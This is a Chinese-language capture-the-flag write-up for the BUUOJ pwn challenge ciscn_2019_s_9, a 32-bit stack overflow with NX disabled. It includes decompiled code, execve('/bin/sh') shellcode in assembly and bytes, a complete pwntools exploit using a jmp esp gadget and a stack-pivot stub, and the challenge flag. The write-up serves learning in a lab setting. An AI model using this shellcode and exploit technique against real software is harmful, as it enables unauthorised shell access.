# ciscn_2019_s_9

[题目地址](https://buuoj.cn/challenges#ciscn_2019_s_9)

完全不会写汇编。

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

啥也没开，好事。main函数内部调用了pwn函数。

```c
int pwn()
{

  char s[24]; // [esp+8h] [ebp-20h] BYREF



  puts("\nHey! ^_^");

  puts("\nIt's nice to meet you");

  puts("\nDo you have anything to tell?");

  puts(">");

  fflush(stdout);

  fgets(s, 0x32, stdin);

  puts("OK bye~");

  fflush(stdout);

  return 1;

}
```

很明显的栈溢出，虽然溢出字节不多，但是我们可以把shellcode存进buffer里，然后想个办法跳转过去就行了，毕竟nx没开。程序内还有个hint函数，佐证了我的思路。

```c
void hint()
{
  __asm { jmp     esp }
}
```

本来打算用pwntools直接生成shellcode，结果发现太长了。我也不会缩短，找个[wp](https://blog.csdn.net/mcmuyanga/article/details/113317412)看看吧。缩短后如下：

```
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
mov al,0xB
int 0x80
```

还有一个我不会但是很重要的点在于，我不知道怎么算buffer存储内容到底距离esp多少。看exp就知道我在说什么了。

```python
from pwn import *

p=remote('node4.buuoj.cn',25537)
context(log_level='debug',arch='i386',os='linux')

jump_esp=0x8048554
shellcode='''
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
mov al,0xB
int 0x80
'''

#hellcode=asm(shellcode)

shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

payload=shellcode.ljust(0x24,b'\x00')+p32(jump_esp) #返回地址填esp，那么程序执行栈还会保留在esp上

#payload+=asm("sub esp,40;call esp")
payload+=b'\x83\xec(\xff\xd4'  #我们接着再往esp里写入这串汇编代码，由于执行栈在这里，便会执行这串代码。代码是为了把esp的值调整到buffer内容（shellcode）的地址。然后call esp执行
p.sendline(payload)
p.interactive()
```

我不知道的地方在于大佬们是怎么算出来esp和buffer内容正好差40的？不行要搞个调试的东西了。

## Flag
- flag{fa7d2c02-e71e-486d-90d9-e0431ba0480a}